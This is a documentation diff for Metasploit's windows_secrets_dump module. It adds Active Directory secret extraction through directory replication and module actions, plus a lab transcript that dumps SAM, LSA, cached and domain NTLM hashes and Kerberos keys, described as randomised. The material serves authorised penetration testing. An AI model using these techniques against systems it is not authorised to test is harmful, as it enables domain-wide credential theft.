@@ -3,16 +3,21 @@
 The `windows_secrets_dump` auxiliary module dumps SAM hashes and LSA secrets
 (including cached creds) from the remote Windows target without executing any
 agent locally. First, it reads as much data as possible from the registry and
-then save the hives locally on the target (%SYSTEMROOT%\\random.tmp).
+then save the hives locally on the target (`%SYSTEMROOT%\\random.tmp`).
 Finally, it downloads the temporary hive files and reads the rest of the data
 from it. These temporary files are removed when it's done.
+
+On domain controllers, secrets from Active Directory is extracted using [MS-DRDS]
+DRSGetNCChanges(), replicating the attributes we need to get SIDs, NTLM hashes,
+groups, password history, Kerberos keys and other interesting data. Note that
+the actual `NTDS.dit` file is not downloaded. Instead, the Directory
+Replication Service directly asks Active Directory through RPC requests.
 
 This modules takes care of starting or enabling the Remote Registry service if
 needed. It will restore the service to its original state when it's done.
 
 This is a port of the great Impacket `secretsdump.py` code written by Alberto
-Solino. Note that the `NTDS.dit` technique has not been implement yet. It will
-be done in a next iteration.
+Solino.
 
 ### Setup
 A privileged user is required to run this module, typically a local or domain
@@ -40,137 +45,275 @@ Windows XP/Server 2003 to Windows 10/Server version 2004.
 ## Options
 Apart from the standard SMB options, no other specific options are needed.
 
+## Actions
+
+### ALL
+This dumps everything (SAM hashes, Cache data, LSA secrets and DOMAIN info).
+This is the default action.
+
+### SAM
+This only dumps the SAM hashes.
+
+### CACHE
+This only dumps the Cached data.
+
+### LSA
+This only dumps the LSA secrets.
+
+### DOMAIN
+This only dumps the NTDS.dit secrets from Active Directory (credentials,
+password history, Kerberos keys, etc.).
+
 ## Scenarios
 The data shown below has been altered with random data to avoid exposing
 sensitive information.
 
-### Windows 10 Version 1809
+### Windows Server 2012 (Domain Controller)
 ```
-msf6 > use auxiliary/gather/windows_secrets_dump
 msf6 auxiliary(gather/windows_secrets_dump) > options
 
 Module options (auxiliary/gather/windows_secrets_dump):
 
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
-   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RHOSTS     192.168.100.123  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT      445              yes       The target port (TCP)
    SMBDomain  .                no        The Windows domain to use for authentication
-   SMBPass                     no        The password for the specified username
-   SMBUser                     no        The username to authenticate as
+   SMBPass    123456           no        The password for the specified username
+   SMBUser    msfuser         no        The username to authenticate as
 
-msf6 auxiliary(gather/windows_secrets_dump) > set RHOSTS 192.68.43.12
-RHOSTS => 192.68.43.12
-msf6 auxiliary(gather/windows_secrets_dump) > set SMBUser msfuser
-SMBUser => msfuser
-msf6 auxiliary(gather/windows_secrets_dump) > set SMBPass mypasswd
-SMBPass => mypasswd
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   ALL   Dump everything
+
+
 msf6 auxiliary(gather/windows_secrets_dump) > run
-[*] Running module against 192.68.43.12
+[*] Running module against 192.168.100.123
 
-[*] 192.68.43.12:445 - Service RemoteRegistry is in stopped state
-[*] 192.68.43.12:445 - Starting service...
-[*] 192.68.43.12:445 - Retrieving target system bootKey
-[+] 192.68.43.12:445 - bootKey: 0x3d354aa5e14d4360a1cc378a9e47338c
-[*] 192.68.43.12:445 - Saving remote SAM database
-[*] 192.68.43.12:445 - Dumping SAM hashes
-[*] 192.68.43.12:445 - Password hints:
+[*] 192.168.100.123:445 - Service RemoteRegistry is in stopped state
+[*] 192.168.100.123:445 - Starting service...
+[*] 192.168.100.123:445 - Retrieving target system bootKey
+[+] 192.168.100.123:445 - bootKey: 0x8f52b915365487d0b2005d3e6ae6eb2b
+[*] 192.168.100.123:445 - Saving remote SAM database
+[*] 192.168.100.123:445 - Dumping SAM hashes
+[*] 192.168.100.123:445 - Password hints:
 No users with password hints on this system
-[*] 192.68.43.12:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b7759c83c817e8b0082fb322bce0073b:::
-msfuser:1001:aad3b435b51404eeaad3b435b51404ee:035ad5f5a5c251c6fc3ba367bee86858:::
-[*] 192.68.43.12:445 - Saving remote SECURITY database
-[*] 192.68.43.12:445 - Decrypting LSA Key
-[*] 192.68.43.12:445 - Dumping LSA Secrets
+[*] 192.168.100.123:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:958be10a71d239e318078816aa929d08:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:84c140afd4e203cc90a977580e78f768:::
+[*] 192.168.100.123:445 - Saving remote SECURITY database
+[*] 192.168.100.123:445 - Decrypting LSA Key
+[*] 192.168.100.123:445 - Dumping LSA Secrets
 $MACHINE.ACC
-MYDOMAIN\MYDESKTOP$:aes256-cts-hmac-sha1-96:8f84e173f9a44708b56806e3d5ee9fa4d21c8edd0da7d29d64cf6122de399b07
-MYDOMAIN\MYDESKTOP$:aes128-cts-hmac-sha1-96:324719fca31fb90274acbd0bf07abf00
-MYDOMAIN\MYDESKTOP$:des-cbc-md5:7561afef18d6e7bb
-MYDOMAIN\MYDESKTOP$:aad3b435b51404eeaad3b435b51404ee:0cb18b83ab17e808b6604175784e8ec2:::
+MYLAB\WIN-340ED5H7S8$:plain_password_hex:b4ac4211cc8ec3f63cf005590bb06aad9c7bd5576ae57b21843d8973b5c208e0ad39b1c7f574d50be9c36fcd379315fccfae3d334364f19df40929b75d7592bf5df715318e2796e68fa59259017ee80b06bc1ac140fb14402c032273101488ab8a0868e90b9ec4e94b73e2b51a6bf9de518474e0cef7f1c7f8f38a575a2bb253dd97ffc0373b6c591cc66acf78ac77da42282291f77b8f4aef0ef9c5e293351caee2dec7c282106603b9d6e2618110394abc1182ae66b3777b738742c087e671e659e547bc45d7fc887407cf89517a4d51bff56f9a31c270037df1a7b80eba0926825a58ae0ee9878ab355cd4062d0b9
+MYLAB\WIN-340ED5H7S8$:aes256-cts-hmac-sha1-96:90f28a5df2b417c96ca2fa18676f3735c4a697b94005378664169f96778400bb
+MYLAB\WIN-340ED5H7S8$:aes128-cts-hmac-sha1-96:5895d4b7a9400f1d6565c1989320a1c6
+MYLAB\WIN-340ED5H7S8$:des-cbc-md5:638a17d7c3480c12
+MYLAB\WIN-340ED5H7S8$:aad3b435b51404eeaad3b435b51404ee:2abda1b5b936ed310fa624d6afbc4c52:::
+
+DefaultPassword
+(Unknown User): FOO$000
 
 DPAPI_SYSTEM
-dpapi_machinekey: 0xa197fe18d264c79b0996b3a987fcd6ea3b6191a6
-dpapi_userkey: 0xab025408f16dc46e6ba79a559751ea4890daf97b
-
-L$ASP.NETAutoGenKeysV44.0.30319.0
-09 5a a2 cf 23 a2 09 ee 4e 55 7b e4 53 98 5c 6c    |.Z..#...NU{.S.\l|
-6d cb 41 00 c8 18 4a 58 95 15 c6 56 98 fe da 79    |m.A...JX...V...y|
-71 d8 43 50 6f 23 f7 0b b9 97 50 d8 b2 a4 4c c9    |q.CPo#....P...L.|
-43 e6 45 23 ec ec 43 72 8c 1f 50 ad 52 a2 64 92    |C.E#..Cr..P.R.d.|
-4a 03 8e be b6 fc 85 4b 65 e3 d0 c7 66 34 0b 14    |J......Ke...f4..|
-13 ae e7 13 c8 25 6b f1 be 55 a4 fe de fa 4b 1d    |.....%k..U....K.|
-0a f5 4d 68 ea 3c 3b 65 d1 69 eb 70 5b 7d 35 1c    |..Mh.<;e.i.p[}5.|
-97 d6 e0 d1 15 65 4e 52 dc 1e 11 9e 35 6a 82 59    |.....eNR....5j.Y|
-30 98 e1 d2 64 0e 2c 2b 4c dd e6 fd 02 36 21 c1    |0...d.,+L....6!.|
-54 e0 18 7c e0 56 ee 25 4b ab b9 75 70 d2 cf c9    |T..|.V.%K..up...|
-38 8e 06 20 31 75 ca 52 d3 9f 6d 99 80 9c f1 ab    |8.. 1u.R..m.....|
-56 51 e3 de 62 be d4 bb ce f7 6b 9c f5 88 74 a7    |VQ..b.....k...t.|
-54 29 51 47 3b e2 9b 7a                            |T)QG;..z|
-Hex string: 095aa2cf23a209ee4e557be453985c6c6dcb4100c8184a589515c65698feda7971d843506f23f70bb99750d8b2a44cc943e64523ecec43728c1f50ad52a264924a038ebeb6fc854b65e3d0c766340b1413aee713c8256bf1be55a4fedefa4b1d0af54d68ea3c3b65d169eb705b7d351c97d6e0d115654e52dc1e119e356a82593098e1d2640e2c2b4cdde6fd023621c154e0187ce056ee254babb97570d2cfc9388e06203175ca52d39f6d99809cf1ab5651e3de62bed4bbcef76b9cf58874a7542951473be29b7a
+dpapi_machinekey: 0xec969866a5bf6bd74f50c790536e58f8cd45da24
+dpapi_userkey: 0xc67ad895123894e9d5d5efd0cf84c00b618cc48e
 
 NL$KM
-40 76 27 cd 14 f9 b3 6e a5 19 fd 03 bd c7 d9 99    |@v'....n........|
-f2 b0 91 78 44 80 e7 b3 7d b6 4f 26 0a 61 8c 6f    |...xD...}.O&.a.o|
-c5 20 e2 65 de ef 98 13 92 e8 db c9 51 3b 5a c2    |. .e........Q;Z.|
-fd 19 66 e6 e9 cd 4f 11 ec 08 82 1b 16 be 41 38    |..f...O.......A8|
-Hex string: 407627cd14f9b36ea519fd03bdc7d999f2b091784480e7b37db64f260a618c6fc520e265deef981392e8dbc9513b5ac2fd1966e6e9cd4f11ec08821b16be4138
+75 31 51 ae 2c 00 3c aa ff 73 db 34 46 c2 93 06    |u1Q.,.<..s.4F...|
+81 85 02 41 02 ad 1b bd 2f 18 e3 4c b4 a7 c4 8a    |...A..../..L....|
+3c 0f d4 29 74 91 a3 08 60 e4 41 1b 84 e8 0e 68    |<..)t...`.A....h|
+67 7a 69 31 b0 e5 1e f9 e1 a6 f5 53 95 12 c3 47    |gzi1.......S...G|
+Hex string: 2a2b513771a2bebc7395ee9648dd7a5e771d52bac713c6edd28f32b3f9259516ca19f562d7f633f55a02dd7f6d4471b7f66ae539327c64fd3c49cdbb267417e1
 
-[*] 192.68.43.12:445 - Decrypting NL$KM
-[*] 192.68.43.12:445 - Dumping cached hashes
-[*] 192.68.43.12:445 - Hashes are in 'mscash2' format
-MYDOMAIN/msfuser:$DCC2$10240#msfuser#86d8081dd11a232080037a83f2165732:MYDOMAIN.INTERNAL:MYDOMAIN
+[*] 192.168.100.123:445 - Decrypting NL$KM
+[*] 192.168.100.123:445 - Dumping cached hashes
+No cached hashes on this system
+[*] 192.168.100.123:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] 192.168.100.123:445 - Using the DRSUAPI method to get NTDS.DIT secrets
+# SID's:
+MYLAB\Administrator: S-1-5-21-413541012-3457123-5043211362-500
+MYLAB\Guest: S-1-5-21-413541012-3457123-5043211362-501
+MYLAB\krbtgt: S-1-5-21-413541012-3457123-5043211362-502
+MYLAB\msfuser: S-1-5-21-413541012-3457123-5043211362-1105
+MYLAB\test: S-1-5-21-413541012-3457123-5043211362-1110
+MYLAB\WIN-340ED5H7S8$: S-1-5-21-413541012-3457123-5043211362-1001
+MYLAB\DESKTOP-EQR2M7J$: S-1-5-21-413541012-3457123-5043211362-1104
+MYLAB\WIN-K1F52W6Q3T1$: S-1-5-21-413541012-3457123-5043211362-1107
+MYLAB\WIN-51S22F6Q7TW$: S-1-5-21-413541012-3457123-5043211362-1109
+MYLAB\WIN2003X86$: S-1-5-21-413541012-3457123-5043211362-1602
 
-[*] 192.68.43.12:445 - Cleaning up...
-[*] 192.68.43.12:445 - Stopping service RemoteRegistry...
+# NTLM hashes:
+MYLAB\Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:::
+MYLAB\Guest:501:aad3b435b51404eeaad3b435b51404ee:0b133f7d7a06732dbb9be367f1123542:::
+MYLAB\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06b220fae92049837807f2398d2c4d7e:::
+MYLAB\msfuser:1105:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:::
+MYLAB\test:1110:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:::
+MYLAB\WIN-340ED5H7S8$:1001:aad3b435b51404eeaad3b435b51404ee:9d58c33fe9fe500125a9b72b51c4b5b5:::
+MYLAB\DESKTOP-EQR2M7J$:1104:aad3b435b51404eeaad3b435b51404ee:2d634718372014e58f1cb37e51954e78:::
+MYLAB\WIN-K1F52W6Q3T1$:1107:aad3b435b51404eeaad3b435b51404ee:14ca1e6a9f228e586c416a3d4c787892:::
+MYLAB\WIN-51S22F6Q7TW$:1109:aad3b435b51404eeaad3b435b51404ee:81d8d1901fc651b09a9654f695e4ff7c:::
+MYLAB\WIN2003X86$:1602:aad3b435b51404eeaad3b435b51404ee:6ded122fc7e0505a3b3f8286d9131c4c:::
+
+# Full pwdump format:
+MYLAB\Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202108100936,LastLogonTimestamp=202109271034,IsAdministrator=true,IsDomainAdmin=true,IsEnterpriseAdmin=true::
+MYLAB\Guest:501:aad3b435b51404eeaad3b435b51404ee:0b133f7d7a06732dbb9be367f1123542:Disabled=true,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=true,PasswordLastChanged=never,LastLogonTimestamp=never,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+MYLAB\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06b220fae92049837807f2398d2c4d7e:Disabled=true,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202106091817,LastLogonTimestamp=never,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+MYLAB\msfuser:1105:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202106100950,LastLogonTimestamp=202109271329,IsAdministrator=true,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+MYLAB\test:1110:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:Disabled=false,Expired=true,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202108121626,LastLogonTimestamp=never,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+MYLAB\WIN-340ED5H7S8$:1001:aad3b435b51404eeaad3b435b51404ee:9d58c33fe9fe500125a9b72b51c4b5b5:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202109241046,LastLogonTimestamp=202109241046,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+MYLAB\DESKTOP-EQR2M7J$:1104:aad3b435b51404eeaad3b435b51404ee:2d634718372014e58f1cb37e51954e78:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202108101043,LastLogonTimestamp=202108101043,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+MYLAB\WIN-K1F52W6Q3T1$:1107:aad3b435b51404eeaad3b435b51404ee:14ca1e6a9f228e586c416a3d4c787892:Disabled=true,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202108091014,LastLogonTimestamp=202108091014,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+MYLAB\WIN-51S22F6Q7TW$:1109:aad3b435b51404eeaad3b435b51404ee:81d8d1901fc651b09a9654f695e4ff7c:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202109281101,LastLogonTimestamp=202109281101,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+MYLAB\WIN2003X86$:1602:aad3b435b51404eeaad3b435b51404ee:6ded122fc7e0505a3b3f8286d9131c4c:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202109291610,LastLogonTimestamp=202109291610,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
+
+# Account Info:
+## CN=Administrator,CN=Users,DC=mylab,DC=local
+- Administrator: true
+- Domain Admin: true
+- Enterprise Admin: true
+- Password last changed: 2021-08-10 09:36:31 UTC
+- Last logon: 2021-09-27 10:34:20 UTC
+- Account disabled: false
+- Computer account: false
+- Expired: false
+- Password never expires: false
+- Password not required: false
+## CN=Guest,CN=Users,DC=mylab,DC=local
+- Administrator: false
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: never
+- Last logon: never
+- Account disabled: true
+- Computer account: false
+- Expired: false
+- Password never expires: true
+- Password not required: true
+## CN=krbtgt,CN=Users,DC=mylab,DC=local
+- Administrator: false
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: 2021-06-09 18:17:48 UTC
+- Last logon: never
+- Account disabled: true
+- Computer account: false
+- Expired: false
+- Password never expires: false
+- Password not required: false
+## CN=msfuser,CN=Users,DC=mylab,DC=local
+- Administrator: true
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: 2021-06-10 09:50:47 UTC
+- Last logon: 2021-09-27 13:29:04 UTC
+- Account disabled: false
+- Computer account: false
+- Expired: false
+- Password never expires: false
+- Password not required: false
+## CN=Test Foo,CN=Users,DC=mylab,DC=local
+- Administrator: false
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: 2021-08-12 16:26:34 UTC
+- Last logon: never
+- Account disabled: false
+- Computer account: false
+- Expired: true
+- Password never expires: false
+- Password not required: false
+## CN=WIN-340ED5H7S8,OU=Domain Controllers,DC=mylab,DC=local
+- Administrator: false
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: 2021-09-24 10:46:19 UTC
+- Last logon: 2021-09-24 10:46:19 UTC
+- Account disabled: false
+- Computer account: true
+- Expired: false
+- Password never expires: false
+- Password not required: false
+## CN=DESKTOP-EQR2M7J,CN=Computers,DC=mylab,DC=local
+- Administrator: false
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: 2021-08-10 10:43:17 UTC
+- Last logon: 2021-08-10 10:43:17 UTC
+- Account disabled: false
+- Computer account: true
+- Expired: false
+- Password never expires: false
+- Password not required: false
+## CN=WIN-K1F52W6Q3T1,CN=Computers,DC=mylab,DC=local
+- Administrator: false
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: 2021-08-09 10:14:39 UTC
+- Last logon: 2021-08-09 10:14:39 UTC
+- Account disabled: true
+- Computer account: true
+- Expired: false
+- Password never expires: false
+- Password not required: false
+## CN=WIN-51S22F6Q7TW,CN=Computers,DC=mylab,DC=local
+- Administrator: false
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: 2021-09-28 11:01:18 UTC
+- Last logon: 2021-09-28 11:01:18 UTC
+- Account disabled: false
+- Computer account: true
+- Expired: false
+- Password never expires: false
+- Password not required: false
+## CN=WIN2003X86,CN=Computers,DC=mylab,DC=local
+- Administrator: false
+- Domain Admin: false
+- Enterprise Admin: false
+- Password last changed: 2021-09-29 16:10:48 UTC
+- Last logon: 2021-09-29 16:10:56 UTC
+- Account disabled: false
+- Computer account: true
+- Expired: false
+- Password never expires: false
+- Password not required: false
+
+# Password history:
+
+# Kerberos keys:
+MYLAB\Administrator:aes256-cts-hmac-sha1-96:058c9987a38ad78866470144eccc90693206bef1b29ef0ef2175f89af61cb2a0
+MYLAB\Administrator:aes128-cts-hmac-sha1-96:c6ad3b805f833825986d0ac34e0f0858
+MYLAB\Administrator:des-cbc-md5:9b86a5602257f19c
+MYLAB\krbtgt:aes256-cts-hmac-sha1-96:a4d8fa9750a53569f003b250ecb55a3e4754e9e1e39c82fc373dfa7755e51860
+MYLAB\krbtgt:aes128-cts-hmac-sha1-96:cde0828d4c759db5195d5b446df27d5a
+MYLAB\krbtgt:des-cbc-md5:e1a9fdabc87fc7fc
+MYLAB\msfuser:aes256-cts-hmac-sha1-96:580b30f097e5f2267502fbfb7038b7d34ed409bf5f043046a6d75372f4748c33
+MYLAB\msfuser:aes128-cts-hmac-sha1-96:ca2c4e745e288a59ba17c2070500f1d0
+MYLAB\msfuser:des-cbc-md5:ba53b946595b3176
+MYLAB\test:aes256-cts-hmac-sha1-96:373f317dcfe7f2293ec881fc1665ca61641122f113e61e228c4484fb7db258df
+MYLAB\test:aes128-cts-hmac-sha1-96:f6e104637495f01efaab2b1a2837918e
+MYLAB\test:des-cbc-md5:2a27b26587ecf324
+MYLAB\WIN-340ED5H7S8$:aes256-cts-hmac-sha1-96:bff8719d09c6f61f8576298c3a5ce00449fa86fc465896b8e0c65b13be04df27
+MYLAB\WIN-340ED5H7S8$:aes128-cts-hmac-sha1-96:df3013df51167b8c988979bcbbb9aad4
+MYLAB\WIN-340ED5H7S8$:des-cbc-md5:8da9946eedeb4c82
+MYLAB\DESKTOP-EQR2M7J$:aes256-cts-hmac-sha1-96:b6b0e92ae339cb75babed5d1208cf931f499e69e87cf2147a4712416ffc6f554
+MYLAB\DESKTOP-EQR2M7J$:aes128-cts-hmac-sha1-96:8481edf93ce4ca794d1de03bb00e4940
+MYLAB\DESKTOP-EQR2M7J$:des-cbc-md5:1ca4baae341a6c8f
+MYLAB\WIN-K1F52W6Q3T1$:aes256-cts-hmac-sha1-96:b57511524ba578a836dc11751070d310d959dd29c6a5a9d46018f26e0d9cf6a8
+MYLAB\WIN-K1F52W6Q3T1$:aes128-cts-hmac-sha1-96:2ff7e707a2bcbaaba22ee4e633d1cce5
+MYLAB\WIN-K1F52W6Q3T1$:des-cbc-md5:93f42858f59c07f2
+MYLAB\WIN-51S22F6Q7TW$:aes256-cts-hmac-sha1-96:01a3e2f3a502324146bd2617961dc5e07e1406eadc3aa5cf97e44843f6773e88
+MYLAB\WIN-51S22F6Q7TW$:aes128-cts-hmac-sha1-96:f03d11faf242766cd08dd7aea5c7bbcc
+MYLAB\WIN-51S22F6Q7TW$:des-cbc-md5:37ee33c8fd401430
+MYLAB\WIN2003X86$:aes256-cts-hmac-sha1-96:a678f096c08c570385a107bdc45184e47366a3ccbdb5333644c548f58d4d6b3c
+MYLAB\WIN2003X86$:aes128-cts-hmac-sha1-96:ff2d54f76093a7641b6825df28203543
+MYLAB\WIN2003X86$:des-cbc-md5:7cfa87f92422ea78
+
+# Clear text passwords:
+[*] 192.168.100.123:445 - Cleaning up...
+[*] 192.168.100.123:445 - Stopping service RemoteRegistry...
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/windows_secrets_dump) > hosts
-
-Hosts
-=====
-
-address        mac  name             os_name  os_flavor  os_sp  purpose  info  comments
--------        ---  ----             -------  ---------  -----  -------  ----  --------
-192.68.43.12       MYDESKTOP  Unknown                    device
-
-msf6 auxiliary(gather/windows_secrets_dump) > services
-Services
-========
-
-host           port  proto  name  state  info
-----           ----  -----  ----  -----  ----
-192.68.43.12  445   tcp    smb   open   Module: auxiliary/gather/windows_secrets_dump, last negotiated version: SMBv3 (dialect = 0x0311)
-
-msf6 auxiliary(gather/windows_secrets_dump) > creds
-Credentials
-===========
-
-host          origin        service        public               private                                                                                          realm     private_type        JtR Format
-----          ------        -------        ------               -------                                                                                          -----     ------------        ----------
-192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\msfuser     MYDOMAIN/msfuser:$DCC2$10240#msfuser#86d8081dd11a232080037a83f2165732:MYDOMAIN.INTE (TRUNCATED)  MYDOMAIN  Nonreplayable hash  mscash2
-192.68.43.12  192.68.43.12  445/tcp (smb)  Guest                aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0                                          NTLM hash           nt,lm
-192.68.43.12  192.68.43.12  445/tcp (smb)  Administrator        aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0                                          NTLM hash           nt,lm
-192.68.43.12  192.68.43.12  445/tcp (smb)  WDAGUtilityAccount   aad3b435b51404eeaad3b435b51404ee:b7759c83c817e8b0082fb322bce0073b                                          NTLM hash           nt,lm
-192.68.43.12  192.68.43.12  445/tcp (smb)  msfuser              aad3b435b51404eeaad3b435b51404ee:035ad5f5a5c251c6fc3ba367bee86858                                          NTLM hash           nt,lm
-192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\MYDESKTOP$  aad3b435b51404eeaad3b435b51404ee:0cb18b83ab17e808b6604175784e8ec2                                MYDOMAIN  NTLM hash           nt,lm
-192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\MYDESKTOP$  MYDOMAIN\MYDESKTOP$:aes256-cts-hmac-sha1-96:8f84e173f9a44708b56806e3d5ee9fa4d21c8ed (TRUNCATED)  MYDOMAIN  Password
-192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\MYDESKTOP$  MYDOMAIN\MYDESKTOP$:aes128-cts-hmac-sha1-96:324719fca31fb90274acbd0bf07abf00                     MYDOMAIN  Password
-192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\MYDESKTOP$  MYDOMAIN\MYDESKTOP$:des-cbc-md5:7561afef18d6e7bb                                                 MYDOMAIN  Password
-192.68.43.12  192.68.43.12  445/tcp (smb)  DefaultAccount       aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0                                          NTLM hash           nt,lm
-
-msf6 auxiliary(gather/windows_secrets_dump) > notes
-
-Notes
-=====
-
- Time                     Host          Service  Port  Protocol  Type               Data
- ----                     ----          -------  ----  --------  ----               ----
- 2020-08-13 12:20:16 UTC  192.68.43.12  smb      445   tcp       host.boot_key      "3d354aa5e14d4360a1cc378a9e47338c"
- 2020-08-13 12:20:20 UTC  192.68.43.12  smb      445   tcp       host.lsa_key       "0483f343addb39221136da0a0f52397aef02e6ee5d8bd05d49390ab97e05dc45"
- 2020-08-13 12:20:20 UTC  192.68.43.12  smb      445   tcp       dpapi.machine_key  "a197fe18d264c79b0996b3a987fcd6ea3b6191a6"
- 2020-08-13 12:20:20 UTC  192.68.43.12  smb      445   tcp       dpapi.user_key     "ab025408f16dc46e6ba79a559751ea4890daf97b"
- 2020-08-13 12:20:20 UTC  192.68.43.12  smb      445   tcp       host.nlkm_key      "40000000000000000000000000000000407627cd14f9b36ea519fd03bdc7d999f2b091784480e7b37db64f260a618c6fc520e265deef981392e8dbc9513b5ac2fd1966e6e9cd4f11ec08821b16be4138e0dd79c41522331dcc5005d731c1738f"
- 2020-08-13 12:20:21 UTC  192.68.43.12  smb      445   tcp       user.cache_info    "Username: msfuser; Iteration count: 10 -> real 10240; Last login: 2020-08-01 20:00:02 +0100; DNS Domain Name: MYDOMAIN.INTERNAL; UPN: msfuser@mydomain.internal; Effective Name: msfuser; Full Name: msfuser; Logon Script: ; Profile Path: ; Home Directory: ; Home Directory Drive: ; User ID: 1004; Primary Group ID: 513; Additional groups: 513; Logon domain name: MYDOMAIN"
 ```
